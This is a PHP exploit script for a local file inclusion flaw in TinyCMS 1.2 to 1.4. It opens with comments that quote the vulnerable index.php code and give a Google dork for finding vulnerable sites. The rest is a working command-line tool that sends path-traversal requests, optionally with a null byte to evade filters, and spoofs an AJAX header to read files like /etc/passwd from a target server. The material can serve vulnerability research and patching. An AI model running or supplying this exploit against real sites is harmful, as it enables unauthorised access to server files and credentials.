<?php 

/* Title:    TinyCMS 1.2 <= 1.4 - Local File Inclusion
 * Author:   Phizo
 * Release:  02/10/2012
 * Affected: 1.2 <= 1.4
 * Vendor:   http://www.tinycms.net/
 */

/************************************************************************************************************************************************************************
 *  All current versions (at the time of release) of TinyCMS appear to be affected by the following local file inclusion vulnerability.                                 *
 *  TinyCMS 1.0 and 1.1 are no longer available on the vendor's website; however, 1.2 through to 1.4 remain today (at the time of release) and are vulnerable.          *
 *                                                                                                                                                                      *                        
 *  The option for omitting or including the null byte in the request was included due to a variety of web-servers often incorporating a WAF (Web Application Firewall) *
 *  and/or magic_quotes_gpc() in-use,  which without circumvention will hinder inclusion of the desired local file.                                                     * 
 *                                                                                                                                                                      * 
 *  The Google dork intext:"Powered by TinyCMS" currently (at the time of release) produces "About 4,510 results."                                                      * 
 *  The vulnerable code along with an exploit has been included.                                                                                                        * 
 ************************************************************************************************************************************************************************/


/***************************************************************************
 *   ========================                                              * 
 *   index.php ~ lines 23-44                                               *  
 *   ========================                                              * 
 *                                                                         * 
 *   if(!isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {                       *
 *       ob_start();                                                       * 
 *       @include 'tpl/wsl.tpl';                                           * 
 *       $page_content = ob_get_contents();                                * 
 *       ob_end_clean();                                                   * 
 *                                                                         * 
 *       echo $page_content;                                               * 
 *   }                                                                     * 
 *   else {                                                                * 
 *       header('content-type: application/json; charset=utf-8');          *
 *                                                                         * 
 *       $page_data = array('pageName' => $_GET['page'], 'content' => ''); *
 *                                                                         * 
 *       ob_start();                                                       * 
 *       @include 'tpl/' . $_GET['page'] . '.html';                        * 
 *       $page_data['content'] = ob_get_contents();                        * 
 *       ob_end_clean();                                                   * 
 *                                                                         * 
 *       echo json_encode($page_data);                                     *
 *   }                                                                     *
 *                                                                         * 
 * }                                                                       * 
 ***************************************************************************/


// =================
//   Exploit code
// =================

echo <<<EOT

    ____________________________________________
    \ TinyCMS 1.2 <= 1.4 - Local File Inclusion /
    /               Author: Phizo               \
    ____________________________________________


EOT;


$options = getopt('u:f:o:n::');

if(!isset($options['u'], $options['f']))
    die("\n\tUsage example: php tinycms.php -u http://target.com/ -f /etc/passwd\n
       -u http://target.com/    The full path to TinyCMS.
       -f /etc/passwd           The file to include.
       -o source.txt            The output file to write to.       [Optional]
       -n                       Omit null byte from request.       [Optional]\n");

$url  =  $options['u'];
$file =  $options['f'];

$output = @$options['o'];
$null   = @$options['n'];

$url     = !isset($null) ? "{$url}?page=../{$file}%00" : "{$url}?page=../{$file}";
$headers = array('User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'X-Requested-With: XMLHttpRequest');

echo "\n[+] URL \t -> {$options['u']}\n";
echo !isset($null) ? "[+] File \t -> {$file}\n" : "[+] File \t -> \t {$file}.html\n";
echo !isset($null) ? "[+] Null byte included\n" : "[+] Null byte omitted\n";
echo "\n[+] Submitting request...\n";

$handle = curl_init();

curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);

$json = curl_exec($handle);
curl_close($handle);

$source = json_decode($json, true);

echo "______________________________________________\n";

if(!empty($source['content']))
{
    if(!isset($output))
        echo "{$source['content']}\n";
    else
        file_put_contents($output, $source['content']);
}
else
{
    die("\n[+] File could not be included.\n");
}

echo "\n[+] Exploit completed.\n";

?> 
